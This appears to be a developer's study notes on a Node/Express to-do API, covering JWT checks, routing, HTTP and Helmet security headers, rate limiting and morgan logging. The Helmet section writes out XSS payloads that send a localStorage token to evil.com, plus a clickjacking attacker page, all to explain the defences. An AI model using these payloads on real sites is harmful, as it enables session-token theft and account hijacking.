**Trap for later:** `user._id` is an `ObjectId` **object**, but after a round trip through `sign` / `verify` it's a plain **string**:

```js
req.user._id === decoded.userId    // false — object vs string
```

Use `.equals()` or `.toString()` when comparing ids directly. Your code sidesteps this today because ids are always handed to Mongoose, which casts them — but it bites on the first manual ownership check.

---

### One small hardening

`jwt.verify(token, process.env.JWT_SECRET)` doesn't pin the algorithm. Modern `jsonwebtoken` guards against the classic `alg: none` and algorithm-confusion tricks, so this isn't exposed today — but passing `{ algorithms: ['HS256'] }` states the intent and removes the class of attack regardless of library version.

---

### One-line summary

**`sign` bakes a user id into a signed, readable, non-revocable token; `verify` proves only that the token is authentic and unexpired; the `findById` after it proves the user still exists; and `req.user` is the trust boundary every ownership check depends on. Stealing a token is impersonation — editing one isn't.**

See also: [`authflow.md`](authflow.md) for the full JWT deep dive, [§8b2](#8b2-task-ownership--where-userid-comes-from) for the id journey, [§16.3](#163-how-oauth-and-openid-connect-actually-work) for how OAuth differs.

---

## 9. What to learn next (routes & Mongoose)

### Express routing

| Topic | One line | In your project |
|-------|----------|-----------------|
| `express.Router()` | Mini-app for grouped routes | `routes/auth.js`, `routes/task.js` |
| `app.use('/auth', router)` | Mount router at prefix | `app.js` line 46 |
| `router.post('/register', fn)` | Method + path + handler | Public register |
| `router.use(protect)` | Middleware on all routes below | `routes/task.js` — all tasks need JWT |
| Route order | `/bulk` before `/:id` | Avoids "bulk" being treated as id |

### Mongoose methods you use (and will use)

| Method | Purpose | Used in |
|--------|---------|---------|
| **`Model.create({ ... })`** | Insert one or many documents | `register` — `User.create` |
| **`Model.findOne({ email })`** | Find first match | `login` |
| **`Model.findById(id)`** | Find by `_id` | `protect` middleware |
| **`Model.find(filter)`** | Find many | `getTasks` |
| **`Model.findOneAndUpdate(filter, data, opts)`** | Update one | `updateTask` |
| **`Model.findOneAndDelete(filter)`** | Delete one | `deleteTask` |
| **`Model.deleteMany(filter)`** | Delete many | `deleteManyTasks` |
| **`Model.insertMany([...])`** | Bulk insert | `createTasksInBulk` |
| **`document.save()`** | Save instance | `createTask` — `new Task(...).save()` |

**`create` vs `save`:**

```js
User.create({ email, password });     // one step — build + save
const user = new User({ email });     // build
await user.save();                    // then save (pre hooks still run)
```

Both trigger **`pre('save')`**.

### Mongoose concepts

| Topic | One line |
|-------|----------|
| **Schema** | Shape + rules for documents |
| **Model** | Class to talk to a collection |
| **Document** | One saved record (`user._id`) |
| **pre('save')** | Run code before DB write |
| **ValidationError** | Schema rule failed → 400 in error handler |
| **11000 error code** | Duplicate key (unique email) |
| **`.select('-password')`** | Exclude field from query result |
| **ObjectId + `ref`** | Link documents (`userId` on tasks) |

### Compare: register vs login route

| | **Register** | **Login** |
|---|--------------|-----------|
| Route | `POST /auth/register` | `POST /auth/login` |
| Middleware | None (public) | None (public) |
| DB | `User.create` | `User.findOne` |
| Password | Hash on save (pre hook) | `bcrypt.compare` |
| Response | User info, no token | Token + user |
| User id | MongoDB creates `_id` | Embeds `_id` in JWT as `userId` |

### Compare: auth vs task ownership

| | **Register / Login** | **Create / Get tasks** |
|---|---------------------|------------------------|
| Auth | Public (no `protect`) | `router.use(protect)` — same Bearer token |
| Id role | Create / embed User `_id` | `req.user._id` → task `userId` / filter |
| Collection | `users` | `tasks` (linked via `userId`) |

### Related docs in this repo

| File | Read for |
|------|----------|
| [`authflow.md`](authflow.md) | JWT, login, protect, token verify |
| [`mongoStructure.md`](mongoStructure.md) | collections, documents, linking tasks to users |
| [`readme.md`](readme.md) | API reference, error handling, **HTTP headers**, learning path |
| [`todo.md`](todo.md) | Future topics to implement |

### External topics (when ready)

| Topic | Why |
|-------|-----|
| [Express routing guide](https://expressjs.com/en/guide/routing.html) | Router, params, middleware order |
| [Mongoose docs — Models](https://mongoosejs.com/docs/models.html) | create, find, update, delete |
| [Mongoose middleware](https://mongoosejs.com/docs/middleware.html) | pre/post save, hooks |
| [Mongoose validation](https://mongoosejs.com/docs/validation.html) | required, enum, custom validators |
| REST status codes | 201 for create, 401 for auth — see `readme.md` API error section |

---

## Quick reference — request layers

| Layer | Register | Login |
|-------|----------|-------|
| URL | `POST /auth/register` | `POST /auth/login` |
| Route | `router.post('/register', register)` | `router.post('/login', login)` |
| Controller | `User.create`, `res.status(201)` | `findOne`, `bcrypt.compare`, `jwt.sign`, `200` |
| Model | Schema + pre-save hash | Schema (read only) |
| Collection | `users` in `todo-app` | `users` in `todo-app` |

---

## 10. HTTP headers — types and what this project needs

Headers carry **metadata** about the request/response — separate from URL, query params, and body.

---

### Request vs response

| Direction | Who sets | Read in your code |
|-----------|----------|-------------------|
| **Request headers** | Client (Postman, Next.js, browser) | `req.headers` |
| **Response headers** | Server (Express, middleware) | `res.set()` / automatic with `res.json()` |

```js
// middleware/auth.js — reading a request header
req.headers.authorization   // "Bearer eyJhbG..."
req.headers['content-type'] // "application/json"
```

Header names are **case-insensitive** (`Authorization` = `authorization`).

---

### Required for this project (you send these)

#### 1. `Content-Type: application/json`

**When:** Any POST or PATCH with a JSON body.

**Why:** Tells Express to parse body as JSON → `req.body`.

Without it, `express.json()` may not populate `req.body` correctly.

```
POST /auth/register
Content-Type: application/json

{ "email": "test@example.com", "password": "secret123" }
```

| Route type | Need `Content-Type`? |
|------------|----------------------|
| GET / DELETE (no body) | No |
| POST / PATCH with JSON | **Yes** |

---

#### 2. `Authorization: Bearer <token>`

**When:** All `/tasks/*` routes (protected by `protect` middleware).

**Why:** Proves who you are — JWT from login.

```js
// middleware/auth.js
if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
    token = req.headers.authorization.split(' ')[1];
}
```

```
GET /tasks
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

| Route | Need `Authorization`? |
|-------|------------------------|
| `POST /auth/register` | No |
| `POST /auth/login` | No |
| `/tasks` (all methods) | **Yes** |

**Format matters:** `Bearer ` + space + token (not just the token alone).

---

### Sent automatically (browser / client)

| Header | Sent by | Used for |
|--------|---------|----------|
| **`Origin`** | Browser on cross-origin calls | Your `cors()` checks this against `CORS_ORIGIN_DEV` / `CORS_ORIGIN` |
| **`Host`** | All HTTP clients | `localhost:3005` |
| **`User-Agent`** | Browser / Postman | Identifies client (logging only) |

Postman often has **no `Origin`** → CORS passes via `if (!origin)` in your config.

Next.js on `localhost:3000` calling API on `3005` → browser sends `Origin: http://localhost:3000`.

---

### Set by your server (response headers)

| Header | Set by | Meaning |
|--------|--------|---------|
| **`Content-Type: application/json`** | `res.json()` | Response body is JSON |
| **`Access-Control-Allow-Origin`** | `cors()` | Which frontend can read response |
| **`Access-Control-Allow-Credentials`** | `cors({ credentials: true })` | Cross-origin requests may send cookies/auth |
| **`Access-Control-Allow-Methods`** | `cors({ methods: [...] })` | Allowed HTTP methods |
| **`Access-Control-Allow-Headers`** | `cors({ allowedHeaders: [...] })` | Client may send `Content-Type`, `Authorization` |
| **`RateLimit-Policy`** | `express-rate-limit` | Rule summary, e.g. `10;w=900` = 10 requests per 900 seconds |
| **`RateLimit-Limit`** | `express-rate-limit` | Max requests allowed in the window |
| **`RateLimit-Remaining`** | `express-rate-limit` | How many requests this client has left |
| **`RateLimit-Reset`** | `express-rate-limit` | Seconds until the counter resets |

These are **response** headers — you don't send them from Postman; the API adds them.

---

### Other common header types (not in project yet)

#### General request headers

| Header | Purpose | This project |
|--------|---------|--------------|
| **`Accept`** | Client prefers `application/json` vs `text/html` | Optional — API always returns JSON |
| **`Accept-Language`** | Preferred language | ❌ not used |
| **`Cache-Control`** | Caching rules | ❌ not used yet |

#### Auth alternatives

| Header | Purpose | This project |
|--------|---------|--------------|
| **`Authorization: Bearer`** | JWT token | ✅ **used** |
| **`Cookie`** | Session ID in cookie | ❌ not used (JWT instead) |
| **`API-Key`** | Simple key in header | ❌ not used |

#### Security response headers (Helmet)

Full explanations in [10b. Safe HTTP headers](#10b-safe-http-headers--what-helmet-actually-does).

| Header | Purpose | Status |
|--------|---------|--------|
| **`Strict-Transport-Security`** | Force HTTPS | ✅ sent — effective after deploy (ignored on `localhost`) |
| **`X-Content-Type-Options`** | Prevent MIME sniffing | ✅ `nosniff` |
| **`X-Frame-Options`** | Clickjacking protection | ✅ `SAMEORIGIN` |
| **`Content-Security-Policy`** | Control loaded resources | ✅ Helmet default |

#### Custom / tracing (future)

| Header | Purpose |
|--------|---------|
| **`X-Request-Id`** | Trace one request in logs |
| **`X-Correlation-Id`** | Link microservice calls |

---

### Quick cheat sheet — by route

All routes are versioned: `/api/v1/...` (see [§13 API versioning](#13-api-versioning--apiv1)).

| Request | Headers to send |
|---------|-----------------|
| `POST /api/v1/auth/register` | `Content-Type: application/json` |
| `POST /api/v1/auth/login` | `Content-Type: application/json` |
| `GET /api/v1/tasks` | `Authorization: Bearer <token>` |
| `POST /api/v1/tasks` | `Content-Type` + `Authorization` |
| `PATCH /api/v1/tasks/:id` | `Content-Type` + `Authorization` |
| `DELETE /api/v1/tasks/:id` | `Authorization` only |
| `DELETE /api/v1/tasks/bulk` | `Content-Type` + `Authorization` |
| `POST /api/v1/tasks/bulk` | `Content-Type` + `Authorization` |
| `GET /health` | none — public, unversioned |

---

### Next.js fetch example (later)

```js
fetch('http://localhost:3005/tasks', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${token}`,
  },
  body: JSON.stringify({ title: 'Buy milk' }),
});
```

Browser adds `Origin` automatically. You add `Content-Type` and `Authorization`.

---

### One-line summary

**This project needs two request headers for most work: `Content-Type: application/json` (when sending a body) and `Authorization: Bearer <token>` (for `/tasks`). CORS response headers are handled by your server for browser clients.**

See also: [`readme.md`](readme.md) HTTP headers section, [`authflow.md`](authflow.md) for JWT in `Authorization`, [10b. Safe HTTP headers](#10b-safe-http-headers--what-helmet-actually-does) for security headers.

---

## 10b. Safe HTTP headers — what Helmet actually does

**Status:** ✅ `app.use(helmet())` — first middleware in `app.js`

### Q: What makes a header a "safe" / security header?

The headers in section 10 carry **data** (`Content-Type`, `Authorization`). Security headers carry **instructions to the browser** — "when you handle this response, refuse to do these dangerous things."

| | Normal headers | Security headers |
|---|----------------|------------------|
| Who reads them | Your code (`req.headers`) / the client app | **The browser** |
| Purpose | Describe the request/response | Restrict what the browser is allowed to do |
| Who enforces | You | The browser |

**Key point:** Postman *shows* response headers (response pane → **Headers** tab) but **ignores** them — it is not a browser. That's why security headers look like they "do nothing" when testing in Postman.

---

### The four to know

#### 1. `X-Content-Type-Options: nosniff` — stop MIME sniffing

Browsers used to **guess** a response's real type instead of trusting `Content-Type` — sniff the bytes, decide "this looks like JavaScript", and run it. The guess is the vulnerability.

```
X-Content-Type-Options: nosniff
```

Now something served as `application/json` can never be reinterpreted as a script.

##### Example — the attack it prevents

Say you add task attachments and serve them from `public/`. An attacker uploads a file named `notes.txt` whose contents are:

```html
<script>fetch('https://evil.com/steal?t=' + localStorage.token)</script>
```

Your server does everything right — it's a `.txt`, so it goes out as text:

```http
GET /uploads/notes.txt

HTTP/1.1 200 OK
Content-Type: text/plain          ← correct!
```

Then the attacker puts this on their own page:

```html
<script src="https://yourapp.com/uploads/notes.txt"></script>
```

**Without `nosniff`:** the browser peeks at the bytes, thinks "that's JavaScript", ignores `text/plain`, and **executes it on your origin** — with access to your `localStorage` token.

**With `nosniff`** the browser refuses and logs:

```
Refused to execute script from 'https://yourapp.com/uploads/notes.txt'
because its MIME type ('text/plain') is not executable, and strict MIME
type checking is enabled.
```

> Note the shape of this bug: your `Content-Type` was **correct** the whole time. The vulnerability was the browser second-guessing you.

#### 2. `X-Frame-Options: DENY` — stop clickjacking

The attack:

```
evil-site.com
┌──────────────────────────────────┐
│  [ Click to claim your prize ]   │  ← attacker's visible button
│                                  │
│  <iframe src="yourapp.com">      │  ← your app, invisible (opacity 0)
│     [ Delete all tasks ]         │  ← sits exactly under the button
└──────────────────────────────────┘
```

You are already logged in, so the iframe is authenticated. Your click lands on the button underneath and the request goes out **with your real credentials**.

**Why existing defenses don't help:** valid JWT, real user, well-formed request, validation passes. Nothing is malformed — the user was tricked about *what they clicked*.

```
X-Frame-Options: DENY          ← no framing at all
X-Frame-Options: SAMEORIGIN    ← only my own domain may frame me
```

##### Example — the attacker's page

The whole attack is this much HTML:

```html
<!-- evil-site.com -->
<style>
  iframe { position: absolute; top: 0; left: 0;
           width: 100%; height: 100%;
           opacity: 0;              /* invisible, but still clickable */
           z-index: 10; }           /* sits ON TOP of the decoy */
  button { position: absolute; top: 300px; left: 200px; }
</style>

<button>Click to claim your prize</button>
<iframe src="https://yourapp.com/tasks"></iframe>
```

The victim sees the button, clicks it, and the click actually lands on whatever sits at that coordinate **inside your app** — with their real session.

**With the header set,** the iframe never renders and the browser logs:

```
Refused to display 'https://yourapp.com/tasks' in a frame because it set
'X-Frame-Options' to 'sameorigin'.
```

**Modern equivalent** — CSP supersedes this header, and both are usually sent:

```
Content-Security-Policy: frame-ancestors 'none'
```

Helmet already sends `frame-ancestors 'self'` as part of its default CSP, which is why your response carries both.

#### 3. `Content-Security-Policy` — stop injected scripts from running

If a stored comment contains `<script>fetch('evil.com?token=' + localStorage.token)</script>` and the frontend renders it, the browser runs it with full access to the page — localStorage, cookies, your API. That's XSS.

Escaping output is the first layer, but one missed spot is a breach. CSP is the second layer: a whitelist of **where resources may come from**.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

An injected inline `<script>` has no source URL, so it isn't "from `'self'`" → the browser refuses to execute it and logs a CSP violation.

##### Example — traced through your own API

Your `Task` model has a `comments` array of strings, so this is a real path, not a hypothetical:

**1. Attacker stores the payload** — it's a valid string, so your validation accepts it (correctly — the API isn't the place to strip HTML):

```json
POST /api/v1/tasks
{
  "title": "Team standup",
  "description": "daily sync",
  "comments": ["<img src=x onerror=\"fetch('https://evil.com?t='+localStorage.token)\">"]
}
```

**2. The frontend renders it** — one careless line is all it takes:

```jsx
<div dangerouslySetInnerHTML={{ __html: task.comments[0] }} />
```

**3a. Without CSP:** the `img` fails to load, `onerror` fires, and the victim's token is sent to `evil.com`. Silent, no visible change to the page.

**3b. With CSP:** the browser blocks it and logs:

```
Refused to execute inline event handler because it violates the following
Content Security Policy directive: "script-src 'self'". Either the
'unsafe-inline' keyword, a hash, or a nonce is required to enable inline
execution.
```

> ⚠️ Notice **where** the defence lives: the payload passed through your API untouched. CSP on this API's responses does nothing here — the header that stops this is the one on the **page that renders** the comment. That's why this matters when the Next.js frontend arrives.

##### Example — reading a policy

```
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:
```

| Directive | Means |
|-----------|-------|
| `default-src 'self'` | Fallback for anything not named below: same origin only |
| `script-src 'self'` | Scripts only from my own domain — **no inline, no CDN** |
| `img-src 'self' data:` | Images from my domain, plus `data:` URIs |

Adding a CDN is a matter of naming it: `script-src 'self' https://cdn.jsdelivr.net`.

**Why people disable it:** it blocks inline scripts/styles by default, which many libraries, analytics snippets and CSS-in-JS tools rely on. Fixing that properly means per-source allowances or nonces.

**For a JSON API:** harmless — no HTML to execute. It becomes real work when Next.js serves pages. Note CSP protects the page that *renders* data, so the header that matters for XSS is the **frontend's**, not the API's.

#### 4. `Strict-Transport-Security` — stop HTTPS downgrade

The gap is the **first** request. Type `yourapp.com` (no protocol) → browser tries `http://` → your server redirects to HTTPS. That first request went out in plaintext, and someone on the same WiFi can answer it with a fake copy of your site (SSL stripping).

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

Seen once, the browser remembers for a year: **never** contact this domain over HTTP again — the redirect now happens inside the browser, before any packet leaves.

##### Example — the two wire sequences

**Without HSTS** (attacker on the same café WiFi):

```
1. user types      yourapp.com
2. browser  ──▶    http://yourapp.com          ← plaintext, interceptable
3. attacker ◀──    answers instead of you, serving a lookalike over http
4. user logs in on the fake page               ← password + token stolen
```

Your real server's HTTPS redirect never got a chance to run — step 3 replaced it.

**With HSTS**, after one prior successful HTTPS visit:

```
1. user types      yourapp.com
2. browser         rewrites to https:// INTERNALLY  ← no packet sent yet
3. browser  ──▶    https://yourapp.com             ← attacker sees only encrypted traffic
```

The fix works because step 2 happens **inside** the browser, so there is no plaintext request to hijack.

**Two catches:**
- Only helps *after* the first successful HTTPS visit (browser preload lists exist for that gap).
- `max-age` is a commitment you can't undo — if your certificate later expires, browsers refuse to connect and you can't reach them over HTTP to fix it. Start with a small `max-age`, raise it when confident.

**Does nothing on `localhost`** over HTTP — browsers ignore it locally. Matters only after deploy with real TLS.

---

### Q: Hand-roll them or use Helmet?

**Use Helmet.** This is the opposite of the input-validation decision (hand-rolled, see `controllers/task.js`):

| | Input validation | Security headers |
|---|------------------|------------------|
| The rules are | **My** business logic (title 3–100, tags ≤ 20) | Standardised, identical for every app |
| Changes when | My product changes | Browsers deprecate things |
| Verdict | ✅ hand-rolled — writing it taught me the domain | ✅ library — maintenance with no upside |

Example of that maintenance: `X-XSS-Protection` used to be recommended, is now considered harmful, and Helmet dropped it.

**Worth doing once for learning:** set the four headers by hand with `res.set()`, look at the response **Headers** tab in Postman, then replace with `app.use(helmet())` and compare — roughly a dozen headers instead of four. That's the concrete answer to "what does this library do for me."

```js
app.use(helmet());
```

**What this project actually sends** (first middleware in `app.js`, so 404s and errors carry them too):

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; ...
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
```

Two of those are worth a second look:

| Header | Why it looks odd |
|--------|------------------|
| **`X-XSS-Protection: 0`** | Deliberately **disabling** the old browser XSS filter — it was itself exploitable, so the modern advice is off + rely on CSP |
| **`X-Frame-Options: SAMEORIGIN`** | Helmet's default is the looser one; `DENY` needs `frameguard: { action: 'deny' }` if the API should never be framed at all |

**Helmet does not break CORS.** `Cross-Origin-Resource-Policy: same-origin` governs *subresource* loading (images, scripts), not `fetch`/XHR — those are still controlled by your CORS config, which runs right after.

**Free win regardless:** Express advertises itself with `X-Powered-By: Express`, telling an attacker what to target. Helmet removes it; without Helmet:

```js
app.disable('x-powered-by');
```

---

### See it on your own server

**List every security header on a response:**

```powershell
(Invoke-WebRequest http://localhost:3005/health -UseBasicParsing).Headers
```

```bash
# bash / git-bash equivalent
curl -sI http://localhost:3005/health
```

**Prove the `/api-docs` relaxation is scoped** — the reason `app.js` has two Helmet configs:

```powershell
$strict = (Invoke-WebRequest http://localhost:3005/health -UseBasicParsing)
$loose  = (Invoke-WebRequest http://localhost:3005/api-docs/ -UseBasicParsing)

$strict.Headers['Content-Security-Policy']   # script-src 'self'
$loose.Headers['Content-Security-Policy']    # script-src 'self' 'unsafe-inline'
```

| Path | `script-src` | Why |
|------|--------------|-----|
| `/health`, `/api/v1/*` | `'self'` | Strict — the global `helmet()` |
| `/api-docs` | `'self' 'unsafe-inline'` | Swagger UI injects an inline init script, which the strict policy blocks |

**Confirm `X-Powered-By` is gone:**

```powershell
(Invoke-WebRequest http://localhost:3005/health -UseBasicParsing).Headers['X-Powered-By']
# empty — Helmet removed it
```

> 💡 **Worth doing once for learning:** comment out `app.use(helmet())`, restart, and re-run the first command. Twelve headers become zero, and `X-Powered-By: Express` reappears. That's the concrete answer to "what does this library actually do for me."

---

### One-line summary

**`nosniff` stops type guessing, `X-Frame-Options` stops clickjacking, CSP stops injected scripts from executing, HSTS stops downgrade attacks — and Helmet sets that whole family with sensible defaults in one line.**

**The examples above share one shape:** in every case your server behaved correctly and the *browser* was the thing being tricked — which is why these headers are instructions to the browser, and why Postman shows them but ignores them.

---

## 11. Rate limiting — what it is, strategies, what we use

**Files:** `middleware/rateLimit.js`, `app.js`, `.env`

### Q: What is rate limiting?

**A:** A cap on **how many requests one client can send in a time window**.

If they exceed the limit, the server responds **`429 Too Many Requests`** instead of running your controller again.

```
Client sends request #11 (limit was 10)
        │
        ▼
  rate limit middleware  → 429 JSON, stop here
        │
        ▼
  controller never runs  (saves DB + CPU)
```

**One line:** Rate limiting protects your API from abuse, brute-force login, and accidental traffic spikes.

---

### Q: Why do we need it?

| Threat | Without rate limit | With rate limit |
|--------|-------------------|-----------------|
| **Brute-force login** | Attacker tries 10,000 passwords | Blocked after N tries per IP |
| **Spam register** | Thousands of fake accounts | Slowed / blocked |
| **API abuse** | One client hammers `GET /tasks` | DB and server stay healthy |
| **Accidental loops** | Buggy frontend retries forever | Stops at the cap |

Rate limiting is **not** a full DDoS solution (huge attacks need CDN/WAF/cloud LB), but it's a **standard baseline** for every production API.

---

### Q: What strategies exist?

#### 1. By algorithm (how the window works)

| Strategy | How it works | Pros | Cons |
|----------|--------------|------|------|
| **Fixed window** | Count requests in fixed blocks (e.g. every 15 min) | Simple, fast | Burst at window boundary |
| **Sliding window** | Rolling time window | Smoother, fairer | More memory / logic |
| **Token bucket** | Tokens refill at a rate; each request costs 1 token | Allows controlled bursts | Harder to configure |
| **Leaky bucket** | Requests queue and drip out at fixed rate | Very smooth output | Can feel slow to clients |

#### 2. By what you limit (the “key”)

| Strategy | Key | Use when |
|----------|-----|----------|
| **Per IP** | `req.ip` | Default — stop abuse from one machine/network |
| **Per user** | `req.user._id` after login | Fair limits per account (paid tiers) |
| **Per route** | Different limits for `/auth` vs `/tasks` | Protect sensitive endpoints more |
| **Per API key** | Header or key id | Public APIs with partner quotas |
| **Global** | Entire server | Protect total capacity |

#### 3. By scope

| Scope | Example |
|-------|---------|
| **Whole app** | `app.use(limiter)` — everything |
| **Route group** | `/auth` stricter than `/tasks` — **what we do** |
| **Single route** | Only `POST /auth/login` |

#### 4. By storage (where counts live)

| Store | When |
|-------|------|
| **In-memory** (default) | Single server, learning, small apps — **what we use** |
| **Redis** | Multiple servers share one counter |
| **Database** | Rare; Redis is preferred at scale |

---

### Q: What did we choose in this project?

| Decision | Our choice | Why |
|----------|------------|-----|
| **Library** | `express-rate-limit` | Standard for Express; easy middleware |
| **Algorithm** | **Fixed window** | Built into the library; good enough to learn |
| **Key** | **Per IP** (`req.ip`) | Default; stops one client from spamming |
| **Scope** | **Two limiters, route groups** | Auth needs stricter rules than tasks |
| **Storage** | **In-memory** | Fine for local dev + single-server deploy |
| **Response** | JSON `429` + `RateLimit-*` headers | Clients know they're blocked and when |

---

### Our two limiters

**File:** `middleware/rateLimit.js`

| Limiter | Mounted on | Default max | Purpose |
|---------|------------|-------------|---------|
| **`authLimiter`** | `/auth/*` | 10 / 15 min | Slow brute-force on login & register |
| **`apiLimiter`** | `/tasks/*` | 10 / 15 min (override via `.env`) | Protect task CRUD from hammering |

Configured via `.env`:

```env
RATE_LIMIT_WINDOW_MS=900000   # 15 minutes in milliseconds
RATE_LIMIT_MAX=100            # /tasks — tune for dev vs prod
RATE_LIMIT_AUTH_MAX=10        # /auth — keep strict
```

**Wired in `app.js`:**

```js
const { apiLimiter, authLimiter } = require('./middleware/rateLimit');

app.use('/tasks', apiLimiter, TaskRoutes);
app.use('/auth', authLimiter, AuthRoutes);
```

**Request flow:**

```
POST /auth/login
     │
     ▼
cors → json → authLimiter → routes/auth → controller

GET /tasks  (+ Bearer token)
     │
     ▼
cors → json → apiLimiter → protect → routes/task → controller
```

Rate limit runs **before** auth and controllers — even failed `401` responses **still count** toward the limit.

---

### Q: What does `429` look like?

**Status:** `429 Too Many Requests`

**Body:**

```json
{
  "message": "Too many requests, please try again later"
}
```

**Response headers (when limit not yet hit):**

| Header | Example | Meaning |
|--------|---------|---------|
| `RateLimit-Policy` | `10;w=900` | 10 requests per 900 seconds |
| `RateLimit-Limit` | `10` | Max allowed |
| `RateLimit-Remaining` | `7` | 3 used, 7 left |
| `RateLimit-Reset` | `895` | Seconds until window resets |

---

### Q: Why did browser get 429 but Postman kept working?

**A:** They often hit **different counters** — not because Postman bypasses the limit.

| Cause | Explanation |
|-------|-------------|
| **`localhost` vs `127.0.0.1`** | Browser may use IPv6 `::1`, Postman IPv4 `127.0.0.1` — **two IPs, two buckets** |
| **CORS preflight** | Cross-origin browser `fetch` sends **OPTIONS + GET** = 2 hits per “one call” |
| **Server restart** | In-memory counter resets — Postman test after restart looks “fresh” |

**Fix for fair testing:** use the same URL everywhere, e.g. always `http://127.0.0.1:3005`.

---

### Q: What changes in production?

| Topic | Dev (now) | Production (later) |
|-------|-----------|-------------------|
| **Store** | In-memory | **Redis** when you run 2+ servers |
| **Limits** | Low for testing (`10`) | Higher for `/tasks`, strict for `/auth` |
| **Trust proxy** | Not needed locally | `app.set('trust proxy', 1)` behind Render/nginx so `req.ip` is the real client IP |
| **Per-user limits** | Not yet | Optional: `keyGenerator: (req) => req.user?.id ?? req.ip` |

---

### Strategies we did **not** use yet (future)

- Sliding window / token bucket (advanced libraries or Redis)
- Per-user rate limits after JWT login
- Separate limiter only on `POST /auth/login`
- Skip counting successful requests (`skipSuccessfulRequests: true`)
- Whitelist internal IPs or health-check path

---

### One-line summary

**We use `express-rate-limit` with a fixed window, per IP, in-memory — stricter on `/auth` (10/15 min) than `/tasks` (configurable). Over limit → `429` JSON + `RateLimit-*` headers. For multi-server production, move counters to Redis.**

See also: [`readme.md` — Rate limiting](readme.md#rate-limiting) and [API performance & monitoring](readme.md#api-performance--monitoring).

---

## 12. Request logging (morgan) + health check

**Status:** ✅ both built — `app.js` (morgan + `GET /health`)

Two related but **different** things: logging tells you what *happened*, the health check tells you whether the app is *alive*.

---

### Q: Why request logging?

Today nothing records requests. When something breaks you only see whatever the global error handler prints — with no idea which request caused it.

Morgan is middleware that logs **one line per request, after the response is sent**:

```
GET /tasks 200 12.483 ms - 1247
POST /auth/login 401 89.201 ms - 38
PATCH /tasks/6a733d 400 3.109 ms - 156
```

| Column | Meaning |
|--------|---------|
| `GET` | Method |
| `/tasks` | URL |
| `200` | Status code |
| `12.483 ms` | **Response time** — first look at slow endpoints |
| `1247` | Response size in bytes |

That response-time column is the underrated one: it's how you'd notice a `$regex` search degrading as the `tasks` collection grows.

### Where it goes

Early in the chain, right after `helmet()` — so **404s and rate-limited 429s get logged too**.

This project mounts morgan **twice**. Destinations and formats are different jobs.

```js
app.use(morgan(isProduction ? morganCombined : morganDev, { skip: skipHealthCheck }));
// ↑ line 34 — always on, writes to process.stdout

if (!isProduction) {
    app.use(morgan(morganCombined, {
        stream: fs.createWriteStream(path.join(logsDir, 'access.log'), { flags: 'a' }),
        skip: skipHealthCheck
    }));
}
// ↑ line 42 — local only, writes to logs/access.log
```

`morganDev` / `morganCombined` are the built-in `dev` and `combined` templates with `:id` (the correlation id) added in front — see [§12b](#12b-correlation-id--asynclocalstorage-which-user-was-that).

| | stdout (line 34) | `logs/access.log` (line 42) |
|---|---|---|
| development | yes, **`dev`** format | yes, **`combined`** format |
| production | yes, **`combined`** format | no |

Locally you get two lines per request on purpose: the terminal line is for reading while you work, the file is history after the terminal is cleared.

### `combined` vs `dev` — templates, not destinations

They only change **what the line looks like**. They do not pick a file or a pipe. Morgan's source (`node_modules/morgan/index.js`):

**`dev`** — short, coloured, for a human in a terminal. Includes response time. No IP, no user-agent.

```
GET /api/v1/tasks 200 12.341 ms - 482
```

Status colour: green (2xx), cyan (3xx), yellow (4xx), red (5xx).

**`combined`** — Apache Combined Log Format. Machine-parseable. What grep / CloudWatch / systemd expect. No colour, no response time.

```
::1 - - [13/Aug/2026:10:55:01 +0530] "GET /api/v1/tasks HTTP/1.1" 200 482 "http://localhost:3000" "Mozilla/5.0 ..."
```

That is why line 34 uses `combined` in production (stdout will be collected) and `dev` locally (you are reading the screen). The file logger always uses `combined` so even locally you have a greppable history.

| Format | Output | Use |
|--------|--------|-----|
| **`dev`** | Short, coloured by status, has duration | Local terminal |
| **`combined`** | Apache combined (IP, user-agent, referrer) | Production / files / log tooling |
| **`tiny`** | Minimal | Noise reduction |

### What morgan does **not** do

| Limit | Fix |
|-------|-----|
| Logs **requests only** — knows nothing about internal app events | ✅ pino for app events ([§12c](#12c-structured-logging-with-pino--levels-json-and-why-not-consolelog)) |
| **Unstructured text** — fine in a terminal, painful to search in a hosting dashboard | ✅ pino writes JSON with levels; morgan's own line is still text (`pino-http` would fix that too) |
| No request id, so multi-line traces can't be correlated | ✅ `X-Request-Id` + `:id` / `:user` tokens ([§12b](#12b-correlation-id--asynclocalstorage-which-user-was-that)) |

⚠️ **Never log the `Authorization` header or request bodies.** Morgan's built-in formats don't — but a custom token makes it easy to write tokens and passwords to disk forever.

---

### Q: What is stdout? And stderr?

**stdout** is the default output channel every process gets from the operating system — "standard output." When your code writes to it, the text leaves the process through a **pipe**. Whoever **started** the process decides where that pipe leads. The process itself does not know.

Every process gets three of these streams at launch:

| Stream | Number | Purpose | In Node |
|--------|--------|---------|---------|
| **stdin** | 0 | input coming in | `process.stdin` |
| **stdout** | 1 | normal output | `process.stdout` — used by `console.log` and by morgan |
| **stderr** | 2 | errors and diagnostics | `process.stderr` — used by `console.error` and Node crash dumps |

Morgan's default (confirmed in the package):

```js
var stream = opts.stream || process.stdout
```

So line 34 never names a file. Same unmodified code, different launcher:

```bash
node app.js                      # → your terminal
node app.js > access.log         # → a file
node app.js | grep " 500 "       # → into another program
docker run my-api                # → captured by Docker, read via `docker logs`
```

That is the fact worth keeping: **morgan writes to stdout; you decide where stdout goes.** CloudWatch, Azure Monitor, systemd, PM2, or a redirect on your own VPS are all just different answers to "who launched me?"

**stderr** is the sibling pipe, not something morgan switches to on a 500. Status 200 and status 500 both go to stdout. The split exists so they can be routed separately:

```bash
node app.js > access.log 2> error.log
```

